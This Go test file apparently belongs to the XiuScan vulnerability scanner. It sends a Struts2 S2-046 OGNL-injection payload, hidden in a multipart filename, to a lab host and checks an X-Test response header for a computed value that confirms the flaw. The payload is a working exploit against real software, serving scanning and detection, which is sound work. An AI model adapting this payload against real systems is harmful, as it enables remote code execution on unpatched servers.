package test

import (
	"fmt"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net"
	"strconv"
	"strings"
	"testing"
)

func TestS2046(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "__rand_1__*__rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	tcpServer, _ := net.ResolveTCPAddr("tcp4", "192.168.222.132:8080")
	conn, _ := net.DialTCP("tcp", nil, tcpServer)
	payload := "POST / HTTP/1.1\r\nHost: localhost:8080\r\nUpgrade-Insecure" +
		"-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS" +
		" X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2" +
		"924.87 Safari/537.36\r\nAccept: text/html,application/xhtml+xml," +
		"application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: e" +
		"n-US,en;q=0.8,es;q=0.6\r\nConnection: close\r\nContent-Type: mul" +
		"tipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL" +
		"2\r\nContent-Length: 278\r\n\r\n------WebKitFormBoundaryXd004BVJ" +
		"N9pBYBL2\r\nContent-Disposition: form-data; name=\"upload\"; fil" +
		"ename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServl" +
		"etResponse'].addHeader('X-Test',__cmd__)}\x00b\"\r\nContent-Type" +
		": text/plain\r\n\r\nfoo\r\n------WebKitFormBoundaryXd004BVJN9pBY" +
		"BL2--"
	output := strings.ReplaceAll(payload, "\r\n", "\\r\\n")
	output = tool.FormatPayload(output)
	log.Info("payload: %s", output)
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	_, _ = conn.Write([]byte(payload))
	buf := make([]byte, 2048)
	_, _ = conn.Read(buf)
	ret := fmt.Sprintf("X-Test: %d", rand1*rand2)
	if strings.Contains(string(buf), ret) {
		log.Info("find S2-046")
	}
}
